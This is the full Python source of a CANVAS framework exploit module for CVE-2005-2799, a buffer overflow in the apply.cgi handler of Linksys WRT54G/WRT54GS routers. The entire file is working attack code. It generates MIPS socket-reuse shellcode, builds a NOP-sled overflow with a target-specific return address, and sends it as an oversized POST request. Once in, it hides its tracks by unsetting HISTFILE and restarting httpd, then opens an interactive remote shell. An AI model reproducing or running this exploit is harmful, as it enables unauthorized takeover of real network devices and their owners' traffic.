#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""

httpd POST Content-Length .data overflow for Linksys

all firwmare WRT54G and WRT54GS from 2.02.7 to 4.20.6 are vuln

"""

VERSION="0.1"

CHANGES="""

Sep 26, 2005.

"""


import sys

sys.path.append(".")
sys.path.append("../../")

import socket
from exploitutils import *
from tcpexploit import tcpexploit
import struct
import errno

from libs.ctelnetlib import Telnet
from shelllistener import shelllistener
from shelllistener import shellfromtelnet

import unixShellNode
from shellcode import shellcodeGenerator

NAME="linksys_apply_cgi"

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Linksys"
DOCUMENTATION["Date public"]="Sep 13, 2005"
DOCUMENTATION["CVE Name"] = "CVE-2005-2799"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2799"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["References"]="http://www.idefense.com/application/poi/display?id=305&type=vulnerabilities"

DESCRIPTION="Linksys WRT54G apply.cgi buffer overflow"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux", "mipsel"] ]


targets = {
    0 : [" WRT54G / WRT54GS { 2.02.7 2.04.4 2.06.1 2.07.1 3.01.3 3.03.1 3.17.4 3.37.2 4.00.5 4.00.7 4.20.6 } ",0x10002000,0x40b8 ],
    1 : ["Autoversioning N/A",  0, 0]
}

class linksysapplycgiExploit:

    def __init__(self, target, port=80):

        self.set_target(target)
        self.set_port(port)
        
        shellcodegen = shellcodeGenerator.linux_mipsel()
        shellcodegen.addAttr("GOFindSockWithShell", ["CleanSockOpt"])
        self.shellcode = shellcodegen.get()
        self.log("Shellcode length: %d" % len(self.shellcode))
        self.name=NAME
        
        return

    def set_target(self, target):
        self.host = socket.gethostbyname(target)

    def get_target(self):
        return self.host

    def set_port(self, port):
        self.port = port

    def get_port(self):
        return self.port

    def setup(self):

        try:
                self.sck=self.gettcpsock()
                self.sck.connect((self.host, self.port))
        except socket.error, why:
                errcode = why[0]
                if errno.errorcode[errcode] == "ECONNREFUSED":
                        self.log("Connection refused")
                        self.log(" : the remote host is not running an httpd, or the httpd can be crashed")
                        self.log(" : if so, wait 2min and try again")
                else:
                        self.log("unexpected socket error")
                return 0
        except socket.timeout:
                self.log("Connection timed out")
                self.log(" : the host does not seem online, or is firewalled")
                return 0;
        except:
                self.log("unexpected socket error")
                return 0
   
        return 1


    def exploit(self, retaddr, ovsize):

        if not self.setup():
                return 0

        self.setProgress(20)

        self.nopsize = 10000 - len(self.shellcode)
        self.postbuf = "\x00\x00\xbd\x27" * (self.nopsize/4)
        self.postbuf += self.shellcode
        self.postbuf += struct.pack('<L', retaddr) * (self.ovfsize/4)
        self.postreq = "POST /apply.cgi HTTP/1.1\r\n"
        self.postbuflen = len(self.postbuf) & ~3
        self.postbufpadlen = self.postbuflen - len(self.postbuf)
        self.postreq += "Content-Type: x\r\n"
        self.postreq += "Content-Length: " + str(self.postbuflen) + "\r\n\r\n"
        self.postreqpadlen = len(self.postreq) % 4
        if self.postreqpadlen: self.postreqpadlen = 4 - self.postreqpadlen
        self.postreq += " " * self.postreqpadlen
        self.postreq += self.postbuf
        self.ovf = self.postreq

        try:
                self.sck.sendall(self.ovf)
        except:
                return 0

        try:
                self.recvbuf = self.sck.recv(500)
        except socket.error, why:
                errcode = why[0]
                if errno.errorcode[errcode] == "ECONNRESET":
                        self.log("Connection reset by peer")
                        self.log(" : the httpd is not vulnerable (too old)")
                        self.log(" : or it crached (wrong options?) -> try again")
                else:
                        self.log("unexpected socket error")
                return 0
        except:
                self.log("unexpected error")
                return 0

        if len(self.recvbuf) != 4 or self.recvbuf != "GOOO":
                self.sck.close()
                if self.recvbuf[:28] == "HTTP/1.0 501 Not Implemented":
                        print "received \"Method Not Implemented\" message"
                        self.log("the httpd seems a too old version (not vulnerable)")
                        self.log("that httpd can run a different firmware that Linksys one")
                else:
                        self.log("received weird unknown answer, is that httpd a Linksys one?")
                        print shellcode_dump(self.recvbuf)
                return 0
        
        return 1

    def proxy(self):

        self.t.write("unset HISTFILE;uname -a;\n")
        self.t.interact()
        sys.exit(1)

    def attack(self):
        self.log("exploiting... retaddr: 0x%08x ovfsize: 0x%04x" % (long(self.retaddr), int(self.ovfsize)))
        if not self.exploit(self.retaddr,self.ovfsize):
                self.setProgress(-1)
                return 0

        self.setProgress(100)
        return self.sck



class theexploit(tcpexploit, linksysapplycgiExploit):

    def __init__(self):
        tcpexploit.__init__(self)
        self.port=80
        self.setHost("")
        self.setVersion(1)
        #self.method=1
        self.cmdline=0
        self.setInfo(DESCRIPTION)
        return

    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))
        self.INFO, self.retaddr, self.ovfsize= targets[self.version]

        return self.dorun()

    def dorun(self):
        linksysapplycgiExploit.__init__(self, self.host, self.port)
        self.sock = self.attack()
        if not self.sock:
                self.log("exploitation failed")
                return 0

        self.setInfo("%s %s:%d successfully exploited!"%(NAME,self.host,self.port))
        self.t = Telnet()
        self.t.sock = self.sock

        self.log("restarting httpd...")
        self.t.write("/usr/sbin/httpd;/sbin/check_ps >/dev/null 2>&1;\n")

        if self.cmdline:
                self.proxy()
                return

        try:
                shell = shelllistener(shellfromtelnet(self.t), logfunction = self.logfunction, simpleShell = 1)
        except:
                self.log("Could not make a shell listener - connection was closed. Exploit most likely failed.")
                self.setProgress(-1)
                return 0

        node = unixShellNode.unixShellNode()
        node.parentnode=self.argsDict["passednodes"][0]
        node.shell = shell
        return node


    def displayVersions(self):
        for a in range(0, len(targets)):
            print "%d : %s" % (a, targets[a][0])
            
        return

    def usage(self):
        print "Usage: "+sys.argv[0]+" -t target [ -p 80] [-s ssl]"
        self.displayVersions()

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    app.options = ["-O retaddr:0x10002000", "-O ovfsize:0x40b8"]
    app.cmdline = 1
    ret=standard_callback_commandline(app)
